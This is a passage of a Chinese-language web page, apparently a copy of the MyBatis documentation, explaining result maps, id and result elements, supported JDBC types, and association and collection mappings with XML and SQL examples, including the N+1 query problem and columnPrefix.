<li>嵌套结果映射 – 集合可以是 <code>resultMap</code> 元素，或是对其它结果映射的引用</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>id</code></td>
<td align="left">当前命名空间中的一个唯一标识，用于标识一个结果映射。</td>
</tr>
<tr>
<td align="left"><code>type</code></td>
<td align="left">类的完全限定名, 或者一个类型别名（关于内置的类型别名，可以参考上面的表格）。</td>
</tr>
<tr>
<td align="left"><code>autoMapping</code></td>
<td align="left">如果设置这个属性，MyBatis 将会为本结果映射开启或者关闭自动映射。 这个属性会覆盖全局的属性 autoMappingBehavior。默认值：未设置（unset）。</td>
</tr>
</tbody></table>
<p><strong>最佳实践</strong> 最好逐步建立结果映射。单元测试可以在这个过程中起到很大帮助。 如果你尝试一次性创建像上面示例那么巨大的结果映射，不仅容易出错，难度也会直线上升。 所以，从最简单的形态开始，逐步迭代。而且别忘了单元测试！ 有时候，框架的行为像是一个黑盒子（无论是否开源）。因此，为了确保实现的行为与你的期望相一致，最好编写单元测试。 并且单元测试在提交 bug 时也能起到很大的作用。</p>
<p>下一部分将详细说明每个元素。</p>
<h3 id="id-amp-result"><a href="#id-amp-result" class="headerlink" title="id &amp; result"></a>id &amp; result</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;post_id&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;subject&quot;</span> <span class="attr">column</span>=<span class="string">&quot;post_subject&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>这些元素是结果映射的基础。<em>id</em> 和 <em>result</em> 元素都将一个列的值映射到一个简单数据类型（String, int, double, Date 等）的属性或字段。</p>
<p>这两者之间的唯一不同是，<em>id</em> 元素对应的属性会被标记为对象的标识符，在比较对象实例时使用。 这样可以提高整体的性能，尤其是进行缓存和嵌套结果映射（也就是连接映射）的时候。</p>
<p>两个元素都有一些属性：</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>property</code></td>
<td align="left">映射到列结果的字段或属性。如果 JavaBean 有这个名字的属性（property），会先使用该属性。否则 MyBatis 将会寻找给定名称的字段（field）。 无论是哪一种情形，你都可以使用常见的点式分隔形式进行复杂属性导航。 比如，你可以这样映射一些简单的东西：“username”，或者映射到一些复杂的东西上：“address.street.number”。</td>
</tr>
<tr>
<td align="left"><code>column</code></td>
<td align="left">数据库中的列名，或者是列的别名。一般情况下，这和传递给 <code>resultSet.getString(columnName)</code> 方法的参数一样。</td>
</tr>
<tr>
<td align="left"><code>javaType</code></td>
<td align="left">一个 Java 类的全限定名，或一个类型别名（关于内置的类型别名，可以参考上面的表格）。 如果你映射到一个 JavaBean，MyBatis 通常可以推断类型。然而，如果你映射到的是 HashMap，那么你应该明确地指定 javaType 来保证行为与期望的相一致。</td>
</tr>
<tr>
<td align="left"><code>jdbcType</code></td>
<td align="left">JDBC 类型，所支持的 JDBC 类型参见这个表格之后的“支持的 JDBC 类型”。 只需要在可能执行插入、更新和删除的且允许空值的列上指定 JDBC 类型。这是 JDBC 的要求而非 MyBatis 的要求。如果你直接面向 JDBC 编程，你需要对可以为空值的列指定这个类型。</td>
</tr>
<tr>
<td align="left"><code>typeHandler</code></td>
<td align="left">我们在前面讨论过默认的类型处理器。使用这个属性，你可以覆盖默认的类型处理器。 这个属性值是一个类型处理器实现类的全限定名，或者是类型别名。</td>
</tr>
</tbody></table>
<h3 id="支持的-JDBC-类型"><a href="#支持的-JDBC-类型" class="headerlink" title="支持的 JDBC 类型"></a>支持的 JDBC 类型</h3><p>为了以后可能的使用场景，MyBatis 通过内置的 jdbcType 枚举类型支持下面的 JDBC 类型。</p>
<table>
<thead>
<tr>
<th><code>BIT</code></th>
<th><code>FLOAT</code></th>
<th><code>CHAR</code></th>
<th><code>TIMESTAMP</code></th>
<th><code>OTHER</code></th>
<th><code>UNDEFINED</code></th>
</tr>
</thead>
<tbody><tr>
<td><code>TINYINT</code></td>
<td><code>REAL</code></td>
<td><code>VARCHAR</code></td>
<td><code>BINARY</code></td>
<td><code>BLOB</code></td>
<td><code>NVARCHAR</code></td>
</tr>
<tr>
<td><code>SMALLINT</code></td>
<td><code>DOUBLE</code></td>
<td><code>LONGVARCHAR</code></td>
<td><code>VARBINARY</code></td>
<td><code>CLOB</code></td>
<td><code>NCHAR</code></td>
</tr>
<tr>
<td><code>INTEGER</code></td>
<td><code>NUMERIC</code></td>
<td><code>DATE</code></td>
<td><code>LONGVARBINARY</code></td>
<td><code>BOOLEAN</code></td>
<td><code>NCLOB</code></td>
</tr>
<tr>
<td><code>BIGINT</code></td>
<td><code>DECIMAL</code></td>
<td><code>TIME</code></td>
<td><code>NULL</code></td>
<td><code>CURSOR</code></td>
<td><code>ARRAY</code></td>
</tr>
</tbody></table>
<h2 id="关联-1对多"><a href="#关联-1对多" class="headerlink" title="关联-1对多"></a>关联-1对多</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;author&quot;</span> <span class="attr">column</span>=<span class="string">&quot;blog_author_id&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;Author&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_id&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;username&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_username&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>关联（association）元素处理“有一个”类型的关系。</p>
<p>比如，在我们的示例中，一个博客有一个用户。关联结果映射和其它类型的映射工作方式差不多。 你需要指定目标属性名以及属性的<code>javaType</code>（很多时候 MyBatis 可以自己推断出来），在必要的情况下你还可以设置 JDBC 类型，如果你想覆盖获取结果值的过程，还可以设置类型处理器。</p>
<p>关联的不同之处是，你需要告诉 MyBatis 如何加载关联。MyBatis 有两种不同的方式加载关联：</p>
<ul>
<li><strong>嵌套 Select 查询：通过执行另外一个 SQL 映射语句来加载期望的复杂类型。</strong></li>
<li><strong>嵌套结果映射：使用嵌套的结果映射来处理连接结果的重复子集。</strong></li>
</ul>
<p>首先，先让我们来看看这个元素的属性。你将会发现，和普通的结果映射相比，它只在 select 和 resultMap 属性上有所不同。</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>property</code></td>
<td align="left">映射到列结果的字段或属性。如果用来匹配的 JavaBean 存在给定名字的属性，那么它将会被使用。否则 MyBatis 将会寻找给定名称的字段。 无论是哪一种情形，你都可以使用通常的点式分隔形式进行复杂属性导航。 比如，你可以这样映射一些简单的东西：“username”，或者映射到一些复杂的东西上：“address.street.number”。</td>
</tr>
<tr>
<td align="left"><code>javaType</code></td>
<td align="left">一个 Java 类的完全限定名，或一个类型别名（关于内置的类型别名，可以参考上面的表格）。 如果你映射到一个 JavaBean，MyBatis 通常可以推断类型。然而，如果你映射到的是 HashMap，那么你应该明确地指定 javaType 来保证行为与期望的相一致。</td>
</tr>
<tr>
<td align="left"><code>jdbcType</code></td>
<td align="left">JDBC 类型，所支持的 JDBC 类型参见这个表格之前的“支持的 JDBC 类型”。 只需要在可能执行插入、更新和删除的且允许空值的列上指定 JDBC 类型。这是 JDBC 的要求而非 MyBatis 的要求。如果你直接面向 JDBC 编程，你需要对可能存在空值的列指定这个类型。</td>
</tr>
<tr>
<td align="left"><code>typeHandler</code></td>
<td align="left">我们在前面讨论过默认的类型处理器。使用这个属性，你可以覆盖默认的类型处理器。 这个属性值是一个类型处理器实现类的完全限定名，或者是类型别名。</td>
</tr>
</tbody></table>
<h3 id="关联的嵌套-Select-查询"><a href="#关联的嵌套-Select-查询" class="headerlink" title="关联的嵌套 Select 查询"></a>关联的嵌套 Select 查询</h3><table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>column</code></td>
<td align="left">数据库中的列名，或者是列的别名。一般情况下，这和传递给 <code>resultSet.getString(columnName)</code> 方法的参数一样。 注意：在使用复合主键的时候，你可以使用 <code>column=&quot;&#123;prop1=col1,prop2=col2&#125;&quot;</code> 这样的语法来指定多个传递给嵌套 Select 查询语句的列名。这会使得 <code>prop1</code> 和 <code>prop2</code> 作为参数对象，被设置为对应嵌套 Select 语句的参数。</td>
</tr>
<tr>
<td align="left"><code>select</code></td>
<td align="left">用于加载复杂类型属性的映射语句的 ID，它会从 column 属性指定的列中检索数据，作为参数传递给目标 select 语句。 具体请参考下面的例子。注意：在使用复合主键的时候，你可以使用 <code>column=&quot;&#123;prop1=col1,prop2=col2&#125;&quot;</code> 这样的语法来指定多个传递给嵌套 Select 查询语句的列名。这会使得 <code>prop1</code> 和 <code>prop2</code> 作为参数对象，被设置为对应嵌套 Select 语句的参数。</td>
</tr>
<tr>
<td align="left"><code>fetchType</code></td>
<td align="left">可选的。有效值为 <code>lazy</code> 和 <code>eager</code>。 指定属性后，将在映射中忽略全局配置参数 <code>lazyLoadingEnabled</code>，使用属性的值。</td>
</tr>
</tbody></table>
<p>示例：子查询</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;blogResult&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Blog&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;author&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_id&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;Author&quot;</span> <span class="attr">select</span>=<span class="string">&quot;selectAuthor&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectBlog&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;blogResult&quot;</span>&gt;</span></span><br><span class="line">  SELECT * FROM BLOG WHERE ID = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectAuthor&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Author&quot;</span>&gt;</span></span><br><span class="line">  SELECT * FROM AUTHOR WHERE ID = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>就是这么简单。我们有两个 select 查询语句：</p>
<p>一个用来加载博客（Blog）</p>
<p>另外一个用来加载作者（Author）</p>
<p>而且博客的结果映射描述了应该使用 <code>selectAuthor</code> 语句加载它的 author 属性。</p>
<p>其它所有的属性将会被自动加载，只要它们的列名和属性名相匹配。</p>
<p>这种方式虽然很简单，但在大型数据集或大型数据表上表现不佳。这个问题被称为“N+1 查询问题”。 概括地讲，N+1 查询问题是这样子的：</p>
<ul>
<li>你执行了一个单独的 SQL 语句来获取结果的一个列表（就是“+1”）。</li>
<li>对列表返回的每条记录，你执行一个 select 查询语句来为每条记录加载详细信息（就是“N”）。</li>
</ul>
<p>这个问题会导致成百上千的 SQL 语句被执行。有时候，我们不希望产生这样的后果。</p>
<p>好消息是，MyBatis 能够对这样的查询进行延迟加载，因此可以将大量语句同时运行的开销分散开来。 然而，如果你加载记录列表之后立刻就遍历列表以获取嵌套的数据，就会触发所有的延迟加载查询，性能可能会变得很糟糕。</p>
<p><strong>所以还有另外一种方法。</strong></p>
<h3 id="关联的嵌套结果映射"><a href="#关联的嵌套结果映射" class="headerlink" title="关联的嵌套结果映射"></a>关联的嵌套结果映射</h3><table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>resultMap</code></td>
<td align="left">结果映射的 ID，可以将此关联的嵌套结果集映射到一个合适的对象树中。 它可以作为使用额外 select 语句的替代方案。它可以将多表连接操作的结果映射成一个单一的 <code>ResultSet</code>。这样的 <code>ResultSet</code> 有部分数据是重复的。 为了将结果集正确地映射到嵌套的对象树中, MyBatis 允许你“串联”结果映射，以便解决嵌套结果集的问题。使用嵌套结果映射的一个例子在表格以后。</td>
</tr>
<tr>
<td align="left"><code>columnPrefix</code></td>
<td align="left">当连接多个表时，你可能会不得不使用列别名来避免在 <code>ResultSet</code> 中产生重复的列名。指定 columnPrefix 列名前缀允许你将带有这些前缀的列映射到一个外部的结果映射中。 详细说明请参考后面的例子。</td>
</tr>
<tr>
<td align="left"><code>notNullColumn</code></td>
<td align="left">默认情况下，在至少一个被映射到属性的列不为空时，子对象才会被创建。 你可以在这个属性上指定非空的列来改变默认行为，指定后，Mybatis 将只在这些列非空时才创建一个子对象。可以使用逗号分隔来指定多个列。默认值：未设置（unset）。</td>
</tr>
<tr>
<td align="left"><code>autoMapping</code></td>
<td align="left">如果设置这个属性，MyBatis 将会为本结果映射开启或者关闭自动映射。 这个属性会覆盖全局的属性 autoMappingBehavior。注意，本属性对外部的结果映射无效，所以不能搭配 <code>select</code> 或 <code>resultMap</code> 元素使用。默认值：未设置（unset）。</td>
</tr>
</tbody></table>
<p>之前，你已经看到了一个非常复杂的嵌套关联的例子。 下面的例子则是一个非常简单的例子，用于演示嵌套结果映射如何工作。 现在我们将博客表和作者表连接在一起，而不是执行一个独立的查询语句，就像这样：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectBlog&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;blogResult&quot;</span>&gt;</span></span><br><span class="line">  select</span><br><span class="line">    B.id            as blog_id,</span><br><span class="line">    B.title         as blog_title,</span><br><span class="line">    B.author_id     as blog_author_id,</span><br><span class="line">    A.id            as author_id,</span><br><span class="line">    A.username      as author_username,</span><br><span class="line">    A.password      as author_password,</span><br><span class="line">    A.email         as author_email,</span><br><span class="line">    A.bio           as author_bio</span><br><span class="line">  from Blog B left outer join Author A on B.author_id = A.id</span><br><span class="line">  where B.id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意查询中的连接，以及为确保结果能够拥有唯一且清晰的名字，我们设置的别名。 这使得进行映射非常简单。现在我们可以映射这个结果：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;blogResult&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Blog&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;blog_id&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;title&quot;</span> <span class="attr">column</span>=<span class="string">&quot;blog_title&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;author&quot;</span> <span class="attr">column</span>=<span class="string">&quot;blog_author_id&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;Author&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;authorResult&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;authorResult&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Author&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_id&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;username&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_username&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_password&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;email&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_email&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;bio&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_bio&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>在上面的例子中，你可以看到，博客（Blog）作者（author）的关联元素委托名为 “authorResult” 的结果映射来加载作者对象的实例。</strong></p>
<p>非常重要： id 元素在嵌套结果映射中扮演着非常重要的角色。</p>
<p>你应该总是指定一个或多个可以唯一标识结果的属性。 </p>
<p>虽然，即使不指定这个属性，MyBatis 仍然可以工作，但是会产生严重的性能问题。 </p>
<p>只需要指定可以唯一标识结果的最少属性。显然，你可以选择主键（复合主键也可以）。</p>
<p>现在，上面的示例使用了外部的结果映射元素来映射关联。这使得 Author 的结果映射可以被重用。 然而，如果你不打算重用它，或者你更喜欢将你所有的结果映射放在一个具有描述性的结果映射元素中。 你可以直接将结果映射作为子元素嵌套在内。这里给出使用这种方式的等效例子：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;blogResult&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Blog&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;blog_id&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;title&quot;</span> <span class="attr">column</span>=<span class="string">&quot;blog_title&quot;</span>/&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 直接在这里映射 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;author&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;Author&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_id&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;username&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_username&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_password&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;email&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_email&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;bio&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_bio&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那如果博客（blog）有一个共同作者（co-author）该怎么办？select 语句看起来会是这样的：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectBlog&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;blogResult&quot;</span>&gt;</span></span><br><span class="line">  select</span><br><span class="line">    B.id            as blog_id,</span><br><span class="line">    B.title         as blog_title,</span><br><span class="line">    A.id            as author_id,</span><br><span class="line">    A.username      as author_username,</span><br><span class="line">    A.password      as author_password,</span><br><span class="line">    A.email         as author_email,</span><br><span class="line">    A.bio           as author_bio,</span><br><span class="line">    CA.id           as co_author_id,</span><br><span class="line">    CA.username     as co_author_username,</span><br><span class="line">    CA.password     as co_author_password,</span><br><span class="line">    CA.email        as co_author_email,</span><br><span class="line">    CA.bio          as co_author_bio</span><br><span class="line">  from Blog B</span><br><span class="line">  left outer join Author A on B.author_id = A.id</span><br><span class="line">  left outer join Author CA on B.co_author_id = CA.id</span><br><span class="line">  where B.id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>回忆一下，Author 的结果映射定义如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;authorResult&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Author&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_id&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;username&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_username&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_password&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;email&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_email&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;bio&quot;</span> <span class="attr">column</span>=<span class="string">&quot;author_bio&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于结果中的列名与结果映射中的列名不同。你需要指定 <code>columnPrefix</code> 以便重复使用该结果映射来映射 co-author 的结果。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;blogResult&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Blog&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;blog_id&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;title&quot;</span> <span class="attr">column</span>=<span class="string">&quot;blog_title&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;author&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">resultMap</span>=<span class="string">&quot;authorResult&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;coAuthor&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">resultMap</span>=<span class="string">&quot;authorResult&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">columnPrefix</span>=<span class="string">&quot;co_&quot;</span> /&gt;</span>   <span class="comment">&lt;!-- 加一个前缀来帮助 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>你已经在上面看到了如何处理“有一个”类型的关联。但是该怎么处理“有很多个”类型的关联呢？这就是我们接下来要介绍的。</p>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;posts&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;domain.blog.Post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;post_id&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;subject&quot;</span> <span class="attr">column</span>=<span class="string">&quot;post_subject&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;body&quot;</span> <span class="attr">column</span>=<span class="string">&quot;post_body&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>集合元素和关联元素几乎是一样的，它们相似的程度之高，以致于没有必要再介绍集合元素的相似部分。 所以让我们来关注它们的不同之处吧。</p>
<p>我们来继续上面的示例，一个博客（Blog）只有一个作者（Author)。但一个博客有很多文章（Post)。 在博客类中，这可以用下面的写法来表示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;Post&gt; posts;</span><br></pre></td></tr></table></figure>

<p>要像上面这样，映射嵌套结果集合到一个 List 中，可以使用集合元素。 和关联元素一样，我们可以使用嵌套 Select 查询，或基于连接的嵌套结果映射集合。</p>
<h3 id="集合的嵌套-Select-查询"><a href="#集合的嵌套-Select-查询" class="headerlink" title="集合的嵌套 Select 查询"></a>集合的嵌套 Select 查询</h3><p>首先，让我们看看如何使用嵌套 Select 查询来为博客加载文章。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--主查询--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectBlog&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;blogResult&quot;</span>&gt;</span></span><br><span class="line">  SELECT * FROM BLOG WHERE ID = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 结果集 映射--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;blogResult&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Blog&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 封装集合 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;posts&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;ArrayList&quot;</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;Post&quot;</span> <span class="attr">select</span>=<span class="string">&quot;selectPostsForBlog&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectPostsForBlog&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Post&quot;</span>&gt;</span></span><br><span class="line">  SELECT * FROM POST WHERE BLOG_ID = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>你可能会立刻注意到几个不同，但大部分都和我们上面学习过的关联元素非常相似。 </p>
<p>首先，你会注意到我们使用的是集合元素。 </p>
<p>接下来你会注意到有一个新的 “ofType” 属性。</p>
<p>这个属性非常重要，它用来将 JavaBean（或字段）属性的类型和集合存储的类型区分开来。 所以你可以按照下面这样来阅读映射：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;posts&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;ArrayList&quot;</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;Post&quot;</span> <span class="attr">select</span>=<span class="string">&quot;selectPostsForBlog&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>读作： “posts 是一个存储 Post 的 ArrayList 集合”</p>
<p>在一般情况下，MyBatis 可以推断 javaType 属性，因此并不需要填写。所以很多时候你可以简略成：</p>
